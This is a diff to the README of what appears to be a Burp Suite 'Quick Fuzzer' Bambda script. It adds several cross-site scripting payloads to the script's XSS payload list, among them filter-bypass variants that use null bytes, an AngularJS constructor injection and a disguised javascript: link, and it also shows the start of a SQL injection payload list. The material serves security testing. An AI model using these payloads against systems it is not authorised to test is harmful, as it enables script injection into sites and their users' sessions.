@@ -5,7 +5,7 @@
 <summary><strong>Quick Fuzzer</strong></summary>
 
 ```
-//Save as fuzzer.bambda -> Repeater Tab -> Custom-Scripts
+//Save as fuzzer.bambda -> Repeater Tab -> Custom-Action
 // This Bambda extracts all parameters and performs comprehensive fuzzing tests
 // You can add/reduce payloads
 // You can add/reduce test cases
@@ -76,7 +76,13 @@ String[] XSS_PAYLOADS = {
     "<marquee+onstart=alert('XSS')>",
     "<a+href=javascript:alert('XSS')>click</a>",
     "<img+src=1+onerror=prompt(1)>",
-    "<svg><script>alert(1)</script></svg>"
+    "<svg><script>alert(1)</script></svg>",
+    "'\"><svg><animate+onbegin=alert('hacked')+attributeName=x></svg>",
+    "<a+href=javascript:alert('hacked')>Click Here</a>",
+    "<IFRAME+SRC=\"javascript:alert('hacked');\"></IFRAME>",
+    "<div+ng-app>+<strong class=\"ng-init:constructor.constructor('alert('hacked')')()\">aaa</strong>+</div>",
+    "<<TexTArEa/*%00//%00*/a=\"not\"/*%00///AutOFocUs////onFoCUS=alert`hacked`+//",
+    "\"'<00 foo=\"<a%20href=\"iavascript :alert(\"XSS-Bypass')\">XSS-CLick</00>--%20/"
 };
 
 String[] SQLI_PAYLOADS = {
